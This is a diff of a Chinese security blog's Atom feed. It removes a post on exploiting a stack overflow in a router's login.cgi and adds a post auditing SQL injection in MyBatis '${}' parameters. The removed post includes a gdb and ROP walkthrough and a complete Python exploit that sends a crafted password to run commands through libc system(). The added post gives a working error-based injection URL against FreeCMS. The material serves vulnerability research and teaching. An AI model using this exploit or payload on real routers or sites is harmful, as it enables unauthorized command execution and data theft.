@@ -4,7 +4,7 @@
   
   <link href="/atom.xml" rel="self"/>
   <link href="http://xdxd.love/"/>
-  <updated>2016-10-14T03:26:26.000Z</updated>
+  <updated>2016-10-11T10:59:42.000Z</updated>
   <id>http://xdxd.love/</id>
   
   <author>
@@ -13,153 +13,6 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
-  
-  <entry>
-    <title><![CDATA[一个路由器登录处的溢出分析和利用]]></title>
-    <link href="http://xdxd.love/2016/10/11/%E4%B8%80%E4%B8%AA%E8%B7%AF%E7%94%B1%E5%99%A8%E7%99%BB%E5%BD%95%E5%A4%84%E7%9A%84%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8/"/>
-    <id>http://xdxd.love/2016/10/11/一个路由器登录处的溢出分析和利用/</id>
-    <published>2016-10-11T06:32:51.000Z</published>
-    <updated>2016-10-14T03:26:26.000Z</updated>
-    <content type="html"><![CDATA[<h2 id="漏洞poc">漏洞poc</h2><p>登录的时候，如果用户名或者密码字段超过一定长度，会导致http服务崩溃。</p>
-<p><img src="/images/luyouqimips1.png" alt=""></p>
-<p>可以看到服务端已经崩溃，对于这个请求，没有任何响应返回。</p>
-<h2 id="动态调试环境">动态调试环境</h2><p>将编译好gdb上传到路由器上。<a href="https://github.com/rapid7/embedded-tools" target="_blank" rel="external">gdb下载地址</a></p>
-<p>使用<a href="http://xdxd.love/2016/10/10/%E5%B8%B8%E7%94%A8linux%E5%91%BD%E4%BB%A4/">nc上传文件</a>。</p>
-<p>在本机上执行：</p>
-<pre><code>nc -l <span class="number">1111</span> &lt; ..<span class="regexp">/embedded-tools/</span>binaries<span class="regexp">/gdbserver/g</span>dbserver.mipsle
-</code></pre><p>路由器上执行：</p>
-<pre><code>nc <span class="number">192.168</span><span class="number">.7</span><span class="number">.51</span> <span class="number">1111</span> &gt; gdb
-</code></pre><p>接受文件保存为gdb。</p>
-<p><img src="/images/luyouqimips2.png" alt=""></p>
-<p>启动gdbserver附加进程进行远程调试。</p>
-<p><img src="/images/luyouqimips3.png" alt=""></p>
-<p>可以看到当密码超长时，程序执行流程被劫持。<br><img src="/images/luyouqimips4.png" alt=""></p>
-<h2 id="代码分析">代码分析</h2><p>搜索函数名login，可以定位到登录处理函数。<br><img src="/images/luyouqimips5.png" alt=""></p>
-<p>最后定位到溢出的代码为：sprintf函数格式化用户名和密码到缓冲区时造成溢出。</p>
-<p><img src="/images/luyouqimips6.png" alt=""></p>
-<h2 id="确定偏移">确定偏移</h2><h3 id="使用metasploit_pattern_generator">使用metasploit pattern generator</h3><p>使用metasploit pattern generator生成450个字符，作为密码发送给服务端。查看崩溃时$RA的地址。</p>
-<p><img src="/images/luyouqimips7.png" alt=""></p>
-<p><img src="/images/luyouqimips8.png" alt=""></p>
-<p>覆盖的寄存器有S0,S1,S2,RA,覆盖的值分别为：0x41396841，0x69413069，0x32694131，0x41336941。以RA为例计算其ascii为：A3iA。由于是小端系统。所以应该为Ai3A。</p>
-<p>使用metasploit pattern offset查找偏移为249。同理可以计算S0等寄存器的偏移。</p>
-<p><img src="/images/luyouqimips9.png" alt=""></p>
-<h3 id="根据代码对栈进行分析">根据代码对栈进行分析</h3><pre><code>.<span class="keyword">text</span>:<span class="number">00406</span>C6C timeout         = -<span class="number">0x1B0</span>
-.<span class="keyword">text</span>:<span class="number">00406</span>C6C var_1A8         = -<span class="number">0x1A8</span>
-.<span class="keyword">text</span>:<span class="number">00406</span>C6C var_1A0         = -<span class="number">0x1A0</span>
-.<span class="keyword">text</span>:<span class="number">00406</span>C6C var_19C         = -<span class="number">0x19C</span>
-.<span class="keyword">text</span>:<span class="number">00406</span>C6C var_198         = -<span class="number">0x198</span>
-.<span class="keyword">text</span>:<span class="number">00406</span>C6C var_118         = -<span class="number">0x118</span>
-.<span class="keyword">text</span>:<span class="number">00406</span>C6C var_116         = -<span class="number">0x116</span>
-.<span class="keyword">text</span>:<span class="number">00406</span>C6C var_10          = -<span class="number">0x10</span>
-.<span class="keyword">text</span>:<span class="number">00406</span>C6C var_C           = -<span class="number">0xC</span>
-.<span class="keyword">text</span>:<span class="number">00406</span>C6C var_8           = -<span class="number">8</span>
-.<span class="keyword">text</span>:<span class="number">00406</span>C6C var_4           = -<span class="number">4</span>
-.<span class="keyword">text</span>:<span class="number">00406</span>C6C
-.<span class="keyword">text</span>:<span class="number">00406</span>C6C                 li      <span class="variable">$gp</span>, <span class="number">0xD18F4</span>
-.<span class="keyword">text</span>:<span class="number">00406</span>C74                 addu    <span class="variable">$gp</span>, <span class="variable">$t9</span>
-.<span class="keyword">text</span>:<span class="number">00406</span>C78                 addiu   <span class="variable">$sp</span>, -<span class="number">0x1C0</span>
-.<span class="keyword">text</span>:<span class="number">00406</span>C7C                 sw      <span class="variable">$ra</span>, <span class="number">0x1C0</span>+var_4(<span class="variable">$sp</span>)
-.<span class="keyword">text</span>:<span class="number">00406</span>C80                 sw      <span class="variable">$s2</span>, <span class="number">0x1C0</span>+var_8(<span class="variable">$sp</span>)
-.<span class="keyword">text</span>:<span class="number">00406</span>C84                 sw      <span class="variable">$s1</span>, <span class="number">0x1C0</span>+var_C(<span class="variable">$sp</span>)
-.<span class="keyword">text</span>:<span class="number">00406</span>C88                 sw      <span class="variable">$s0</span>, <span class="number">0x1C0</span>+var_10(<span class="variable">$sp</span>)
-.<span class="keyword">text</span>:<span class="number">00406</span>C8C                 sw      <span class="variable">$gp</span>, <span class="number">0x1C0</span>+var_1A8(<span class="variable">$sp</span>)
-.<span class="keyword">text</span>:<span class="number">00406</span>C90                 la      <span class="variable">$t9</span>, memset
-.<span class="keyword">text</span>:<span class="number">00406</span>C94                 addiu   <span class="variable">$s0</span>, <span class="variable">$sp</span>, <span class="number">0x1C0</span>+var_118
-.<span class="keyword">text</span>:<span class="number">00406</span>C98                 <span class="keyword">move</span>    <span class="variable">$s1</span>, <span class="variable">$a0</span>
-.<span class="keyword">text</span>:<span class="number">00406</span>C9C                 <span class="keyword">move</span>    <span class="variable">$s2</span>, <span class="variable">$a1</span>
-.<span class="keyword">text</span>:<span class="number">00406</span>CA0                 <span class="keyword">move</span>    <span class="variable">$a0</span>, <span class="variable">$s0</span>         # s
-.<span class="keyword">text</span>:<span class="number">00406</span>CA4                 <span class="keyword">move</span>    <span class="variable">$a1</span>, <span class="variable">$zero</span>       # c
-.<span class="keyword">text</span>:<span class="number">00406</span>CA8                 jalr    <span class="variable">$t9</span> ; memset
-.<span class="keyword">text</span>:<span class="number">00406</span>CAC                 li      <span class="variable">$a2</span>, <span class="number">0x102</span>       # n
-.<span class="keyword">text</span>:<span class="number">00406</span>CB0                 lw      <span class="variable">$gp</span>, <span class="number">0x1C0</span>+var_1A8(<span class="variable">$sp</span>)
-.<span class="keyword">text</span>:<span class="number">00406</span>CB4                 beqz    <span class="variable">$s1</span>, loc_406E54
-.<span class="keyword">text</span>:<span class="number">00406</span>CB8                 nop
-.<span class="keyword">text</span>:<span class="number">00406</span>CBC                 beqz    <span class="variable">$s2</span>, loc_406E54
-.<span class="keyword">text</span>:<span class="number">00406</span>CC0                 li      <span class="variable">$v0</span>, <span class="number">0x32</span>  # <span class="string">'2'</span>
-.<span class="keyword">text</span>:<span class="number">00406</span>CC4                 la      <span class="variable">$a1</span>, aDx_selectedind  # <span class="string">"dx.selectedIndex =%d;\n"</span>
-.<span class="keyword">text</span>:<span class="number">00406</span>CC8                 la      <span class="variable">$t9</span>, sprintf
-.<span class="keyword">text</span>:<span class="number">00406</span>CCC                 <span class="keyword">move</span>    <span class="variable">$a2</span>, <span class="variable">$s1</span>
-.<span class="keyword">text</span>:<span class="number">00406</span>CD0                 addiu   <span class="variable">$a1</span>, (aUsernameSPassw - <span class="number">0x480000</span>)  # <span class="string">"username:%s\r\npassword:%s\r\n"</span>
-.<span class="keyword">text</span>:<span class="number">00406</span>CD4                 <span class="keyword">move</span>    <span class="variable">$a3</span>, <span class="variable">$s2</span>
-.<span class="keyword">text</span>:<span class="number">00406</span>CD8                 addiu   <span class="variable">$a0</span>, <span class="variable">$sp</span>, <span class="number">0x1C0</span>+var_116  # s
-.<span class="keyword">text</span>:<span class="number">00406</span>CDC                 jalr    <span class="variable">$t9</span> ; sprintf
-</code></pre><p>程序首先分配栈空间（addiu   $sp, -0x1C0），然后保存寄存器的值到栈上（sw      $ra, 0x1C0+var_4($sp)，sw      $s2, 0x1C0+var_8($sp)…），使用memset对栈空间的某个变量进行置零初始化。然后对a0，a1，就是传入的用户名密码做一个判断是否为0的判断，并没有检查长度。而sprintf函数的第一个参数a0的长度分配为($sp, 0x1C0+var_116)-16=262。</p>
-<p>其栈空间的分布如下图：<br><img src="/images/luyouqimips10.png" alt=""><br>由于字符串中拼接了用户名和其他的字符。password字段只需要249个字节之后就可以覆盖$RA。</p>
-<h2 id="利用ROP实现命令执行">利用ROP实现命令执行</h2><p>使用libc.so.0动态库中的gadget。搜索system函数地址为0004C7E0<br><img src="/images/luyouqimips11.png" alt=""></p>
-<p>使用mips rop finder插件搜索讲堆栈数据写入寄存器的指令。使用命令 mipsrop.stackfinders()</p>
-<p><img src="/images/luyouqimips12.png" alt=""></p>
-<pre><code>.text:<span class="number">000257</span>A<span class="number">0</span>                 addiu   <span class="variable">$a0</span>, <span class="variable">$sp</span>, <span class="number">0x58</span>+var_4<span class="number">0</span>
-.text:<span class="number">000257</span>A4                 move    <span class="variable">$t9</span>, <span class="variable">$s0</span>
-.text:<span class="number">000257</span>A8                 jalr    <span class="variable">$t9</span>
-</code></pre><p>0x000257A0处的的指令非常完美。将栈数据写入a0,然后跳转S0,而S0也是我们可以控制的。</p>
-<p>所以整个rop的流程为：</p>
-<p><img src="/images/luyouqimips13.png" alt=""></p>
-<p>由于libc.so.0是动态加载的，所以开始获取到的system地址是一个相对基址的偏移地址。需要获取libc.so.0动态库的基址为2ac81000。获取命令为：</p>
-<p><img src="/images/luyouqimips14.png" alt=""></p>
-<p>最终的exp如下：</p>
-<pre><code><span class="comment">#!/usr/bin/env python</span>
-<span class="comment"># encoding: utf-8</span>
-
-<span class="string">"""
-@version: 0.01
-@author: xdxd
-@license: Apache Licence 
-@contact: 646901834@qq.com
-@site: http://www.xdxd.love
-@software: PyCharm
-@file: mipsexp.py.py
-@time: 16/10/13 上午10:48
-"""</span>
-<span class="keyword">import</span> sys
-<span class="keyword">import</span> time
-<span class="keyword">import</span> string
-<span class="keyword">import</span> socket
-<span class="keyword">from</span> random <span class="keyword">import</span> Random
-<span class="keyword">import</span> urllib, urllib2, httplib
-<span class="keyword">import</span> json,struct
-<span class="keyword">import</span> requests
-
-<span class="function"><span class="keyword">def</span> <span class="title">makenop</span><span class="params">(length)</span>:</span>
-    <span class="keyword">return</span> <span class="string">'B'</span> * length
-
-<span class="function"><span class="keyword">def</span> <span class="title">makepayload</span><span class="params">(rop, cmd)</span>:</span>
-    payload = makenop(<span class="number">237</span>)
-    payload += struct.pack(<span class="string">"&lt;L"</span>, rop[<span class="number">1</span>])
-    payload += makenop(<span class="number">8</span>)
-    payload += struct.pack(<span class="string">"&lt;L"</span>, rop[<span class="number">0</span>])  <span class="comment"># eip</span>
-    payload += makenop(<span class="number">0x18</span>)
-    payload += cmd
-    payload += <span class="string">"||"</span>
-    open(<span class="string">'shellcode'</span>, <span class="string">'wb'</span>).write(payload)
-    <span class="keyword">return</span> payload
-<span class="function"><span class="keyword">def</span> <span class="title">requestsbody</span><span class="params">(url,palyload)</span>:</span>
-    proxies = {
-        <span class="string">'http'</span>: <span class="string">'http://127.0.0.1:8080'</span>,
-        <span class="string">'https'</span>: <span class="string">'http://127.0.0.1:8080'</span>,
-    }
-    requests.post(url,data=payload,proxies=proxies)
-
-<span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:
-    cmd = <span class="string">"echo testxdxd &gt; /tmp/expxdxd"</span>
-    <span class="comment"># cmd ="ls"</span>
-    url = <span class="string">"http://192.168.7.1/login.cgi"</span>
-
-    libso = <span class="number">0x2ac81000</span>
-    rop = [libso + <span class="number">0x257A0</span>, libso + <span class="number">0x4c7E0</span>]
-    <span class="keyword">print</span> hex(rop[<span class="number">0</span>]), hex(rop[<span class="number">1</span>])
-    payload = {<span class="string">'username'</span>: <span class="string">'admin'</span>, <span class="string">'userpwd'</span>:makepayload(rop,cmd)}
-    requestsbody(url,payload)
-</code></pre><p><img src="/images/luyouqimips15.png" alt=""></p>
-]]></content>
-    <summary type="html">
-    <![CDATA[<h2 id="漏洞poc">漏洞poc</h2><p>登录的时候，如果用户名或者密码字段超过一定长度，会导致http服务崩溃。</p>
-<p><img src="/images/luyouqimips1.png" alt=""></p>
-<p>可以看到服务端已经崩溃，对于这个请]]>
-    </summary>
-    
-      <category term="万物互联" scheme="http://xdxd.love/categories/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
-    
-  </entry>
   
   <entry>
     <title><![CDATA[常用linux命令]]></title>
@@ -1166,6 +1019,124 @@ divEl.innerHTML = payload;
     </summary>
     
       <category term="前端安全" scheme="http://xdxd.love/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[审计mybatis的sql注入]]></title>
+    <link href="http://xdxd.love/2016/03/14/%E5%AE%A1%E8%AE%A1mybatis%E7%9A%84sql%E6%B3%A8%E5%85%A5/"/>
+    <id>http://xdxd.love/2016/03/14/审计mybatis的sql注入/</id>
+    <published>2016-03-14T07:27:24.000Z</published>
+    <updated>2016-03-15T02:24:39.000Z</updated>
+    <content type="html"><![CDATA[<h1 id="mybatis_概述">mybatis 概述</h1><p><a href="http://www.mybatis.org/" target="_blank" rel="external">MyBatis</a>是支持定制化 SQL、存储过程以及高级映射的优秀的持久层框架。MyBatis 避免了几乎所有的 JDBC 代码和手动设置参数以及获取结果集。MyBatis 可以对配置和原生Map使用简单的 XML 或注解，将接口和 Java 的 POJOs(Plain Old Java Objects,普通的 Java对象)映射成数据库中的记录</p>
+<h1 id="mybatis存在的sql注入问题">mybatis存在的sql注入问题</h1><p>mybatis避免了用户直接拼接SQL语句，但是认为只要使用了mybatis就可以杜绝SQL注入的观点是不正确的。mybatis在配置SQL语句的时候，有两种描述参数的方式。<code>#{}</code>和<code>${}</code>。</p>
+<p>比如：</p>
+<pre><code>&lt;<span class="keyword">select</span> id=<span class="string">"selectPerson"</span> parameterType=<span class="string">"int"</span> resultType=<span class="string">"hashmap"</span>&gt;
+  <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> PERSON <span class="keyword">WHERE</span> ID = <span class="preprocessor">#{id}</span>
+&lt;/<span class="keyword">select</span>&gt;
+</code></pre><p>这个语句被称作 selectPerson，接受一个 int（或 Integer）类型的参数，并返回一个 HashMap类型的对象，其中的键是列名，值便是结果行中的对应值。</p>
+<p>注意参数符号：</p>
+<pre><code>#{<span class="ruby">id}</span>
+</code></pre><p>这就告诉 MyBatis 创建一个预处理语句参数，通过 JDBC，这样的一个参数在 SQL中会由一个“?”来标识，并被传递到一个新的预处理语句中，就像这样：</p>
+<pre><code>// Similar JDBC <span class="preprocessor">code</span>, NOT MyBatis…
+<span class="keyword">String </span><span class="keyword">selectPerson </span>= <span class="string">"SELECT * FROM PERSON WHERE ID=?"</span><span class="comment">;</span>
+<span class="label">PreparedStatement</span> ps = conn.prepareStatement(<span class="keyword">selectPerson);
+</span><span class="label">ps.setInt</span>(<span class="number">1</span>,id)<span class="comment">;</span>
+</code></pre><p>使用<code>#</code>mybatis会使用预编译来处理参数，这样子可以避免SQL注入。</p>
+<p>但是使用<code>$</code>描述参数会直接把变量拼接到SQL语句中，不做任何处理。相当于直接字符串拼接SQL。这样的方式就可能存在SQL注入。下面的描述来自mybatis官方文档。</p>
+<pre><code>默认情况下,使用#{}格式的语法会导致 MyBatis 创建预处理语句属性并安全地设置值（比如?）。这样做更安全，更迅速，通常也是首选做法，不过有时你只是想直接在 SQL 语句中插入一个不改变的字符串。比如，像 <span class="keyword">ORDER</span> <span class="keyword">BY</span>，你可以这样来使用：
+
+<span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="label">${columnName}</span>
+这里 MyBatis 不会修改或转义字符串。
+
+<span class="keyword">NOTE</span> 以这种方式接受从用户输出的内容并提供给语句中不变的字符串是不安全的，会导致潜在的 SQL 注入攻击，因此要么不允许用户输入这些字段，要么自行转义并检验。
+</code></pre><h1 id="demo演示">demo演示</h1><p>使用<a href="http://www.cnblogs.com/zhanjindong/p/3397828.html" target="_blank" rel="external">MyBatis使用示例</a>作为demo测试。</p>
+<p>mapper文件：</p>
+<pre><code><span class="pi">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span>
+<span class="doctype">&lt;!DOCTYPE mapper
+        PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN"
+        "http://mybatis.org/dtd/mybatis-3-mapper.dtd"&gt;</span>
+<span class="tag">&lt;<span class="title">mapper</span> <span class="attribute">namespace</span>=<span class="value">"test.mybatis.UserMapper"</span>&gt;</span>
+    <span class="comment">&lt;!-- 这里namespace必须是UserMapper接口的路径” --&gt;</span>
+    <span class="tag">&lt;<span class="title">insert</span> <span class="attribute">id</span>=<span class="value">"insertUser"</span> <span class="attribute">parameterType</span>=<span class="value">"User"</span>&gt;</span>
+        insert into user(name,age) values(#{name},#{age})
+        <span class="comment">&lt;!-- 这里sql结尾不能加分号，否则报“ORA-00911”的错误 --&gt;</span>
+    <span class="tag">&lt;/<span class="title">insert</span>&gt;</span>
+    <span class="comment">&lt;!-- 这里的id必须和UserMapper接口中的接口方法名相同 --&gt;</span>
+    <span class="tag">&lt;<span class="title">select</span> <span class="attribute">id</span>=<span class="value">"getUser"</span> <span class="attribute">resultType</span>=<span class="value">"User"</span>&gt;</span>
+        select * from user where name=#{name}
+    <span class="tag">&lt;/<span class="title">select</span>&gt;</span>
+<span class="tag">&lt;/<span class="title">mapper</span>&gt;</span>
+</code></pre><p>在输入中插入单引号</p>
+<pre><code><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">getUser</span>(<span class="params"></span>) </span>{
+    SqlSession sqlSession = sqlSessionFactory.openSession();
+    <span class="keyword">try</span> {
+        UserMapper userMapper = sqlSession.getMapper(UserMapper.class);
+        User user = userMapper.getUser(<span class="string">"'zhangsan"</span>);
+        System.<span class="keyword">out</span>.println(<span class="string">"name: "</span> + user.getName() + <span class="string">"|age: "</span>
+                + user.getAge());
+    } <span class="keyword">finally</span> {
+        sqlSession.close();
+    }
+</code></pre><p>查看执行的sql语句：</p>
+<p><img src="/images/mybatis21.png" alt=""></p>
+<p>可以看到输入被单引号包裹，并且对字符串中的单引号进行了转义。</p>
+<p>将<code>#</code>改成<code>$</code>,mapper文件为：</p>
+<pre><code>&lt;<span class="keyword">select</span> id=<span class="string">"getUser"</span> resultType=<span class="string">"User"</span>&gt;
+    <span class="keyword">select</span> * <span class="keyword">from</span> user <span class="keyword">where</span> name=${_parameter}
+&lt;/<span class="keyword">select</span>&gt;
+</code></pre><p>这里由于代码的写法问题，name需要改成_parameter,参考<a href="http://woshixy.blog.51cto.com/5637578/1180914" target="_blank" rel="external">Mybatis中传参包There is no getter for property named XXX in class java.lang.String</a>。</p>
+<p>查看执行的SQL语句：</p>
+<p><img src="/images/mybatis22.png" alt=""></p>
+<p>输入没有任何改变的拼接到SQL中，造成了SQL注入。</p>
+<h1 id="实战分析">实战分析</h1><p>mybatis generator插件默认生成的order by 条件是使用<code>$</code>表示变量。</p>
+<pre><code>...
+ <span class="tag">&lt;<span class="title">select</span> <span class="attribute">id</span>=<span class="value">"selectByExample"</span> <span class="attribute">resultMap</span>=<span class="value">"BaseResultMap"</span> <span class="attribute">parameterType</span>=<span class="value">"com.tgwoo.ctspmt.model.MtVMsgItemExample"</span> &gt;</span>
+    <span class="tag">&lt;<span class="title">include</span> <span class="attribute">refid</span>=<span class="value">"OracleDialectPrefix"</span> /&gt;</span>
+    select
+    <span class="tag">&lt;<span class="title">if</span> <span class="attribute">test</span>=<span class="value">"distinct"</span> &gt;</span>
+      distinct
+    <span class="tag">&lt;/<span class="title">if</span>&gt;</span>
+    <span class="tag">&lt;<span class="title">include</span> <span class="attribute">refid</span>=<span class="value">"Base_Column_List"</span> /&gt;</span>
+    from CTSPMT.MT_V_MSG_ITEM
+    <span class="tag">&lt;<span class="title">if</span> <span class="attribute">test</span>=<span class="value">"_parameter != null"</span> &gt;</span>
+      <span class="tag">&lt;<span class="title">include</span> <span class="attribute">refid</span>=<span class="value">"Example_Where_Clause"</span> /&gt;</span>
+    <span class="tag">&lt;/<span class="title">if</span>&gt;</span>
+    <span class="tag">&lt;<span class="title">if</span> <span class="attribute">test</span>=<span class="value">"orderByClause != null"</span> &gt;</span>
+      order by ${orderByClause}
+    <span class="tag">&lt;/<span class="title">if</span>&gt;</span>
+    <span class="tag">&lt;<span class="title">include</span> <span class="attribute">refid</span>=<span class="value">"OracleDialectSuffix"</span> /&gt;</span>
+  <span class="tag">&lt;/<span class="title">select</span>&gt;</span>
+...
+  <span class="tag">&lt;<span class="title">sql</span> <span class="attribute">id</span>=<span class="value">"OracleDialectPrefix"</span> &gt;</span>
+    <span class="tag">&lt;<span class="title">if</span> <span class="attribute">test</span>=<span class="value">"page != null"</span> &gt;</span>
+      select * from ( select row_.*, rownum rownum_ from ( 
+    <span class="tag">&lt;/<span class="title">if</span>&gt;</span>
+  <span class="tag">&lt;/<span class="title">sql</span>&gt;</span>
+  <span class="tag">&lt;<span class="title">sql</span> <span class="attribute">id</span>=<span class="value">"OracleDialectSuffix"</span> &gt;</span>
+    <span class="tag">&lt;<span class="title">if</span> <span class="attribute">test</span>=<span class="value">"page != null"</span> &gt;</span>
+      <span class="cdata">&lt;![CDATA[ ) row_ ) where rownum_ &gt; #{page.begin} and rownum_ &lt;= #{page.end} ]]&gt;</span>
+    <span class="tag">&lt;/<span class="title">if</span>&gt;</span>
+  <span class="tag">&lt;/<span class="title">sql</span>&gt;</span>
+...
+</code></pre><p>所以使用mybatis generator插件生成的代码中，需要自己过滤order by参数，如果用户可控就会导致SQL注入。而大部分情况下，开发者可能没有意识到这个问题。</p>
+<p>以freecms为例。<a href="http://www.freeteam.cn/" target="_blank" rel="external">Freecms</a>是一款开源javacms。最新版下载<a href="http://www.freeteam.cn/freecms1.5.rar" target="_blank" rel="external">地址</a>。freecms中的orderby都是使用的<code>$</code>描述变量。</p>
+<p><img src="/images/mybatis23.png" alt=""></p>
+<p>前面的分析可以知道，这种情况，mybatis会直接拼接字符串到SQL中不做任何处理。</p>
+<p>注册用户登录访问：</p>
+<pre><code>http://192.168.99.100:8080/freecms/member/creditlog_list.do?order=extractvalue(1,concat(0x7C,(select%20user()),0x7C))
+</code></pre><p><img src="/images/mybatis24.png" alt=""></p>
+<p>查看执行的SQL为：</p>
+<p><img src="/images/mybatis25.png" alt=""></p>
+<h1 id="修复方案">修复方案</h1><p>尽量使用<code>#</code>描述参数，如果一定要使用<code>$</code>，则需要自己过滤用户输入。</p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<h1 id="mybatis_概述">mybatis 概述</h1><p><a href="http://www.mybatis.org/" target="_blank" rel="external">MyBatis</a>是支持定制化 SQL、存储过程以及高级映射的优秀的持]]>
+    </summary>
+    
+      <category term="java" scheme="http://xdxd.love/tags/java/"/>
+    
+      <category term="代码审计" scheme="http://xdxd.love/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
     
   </entry>
   
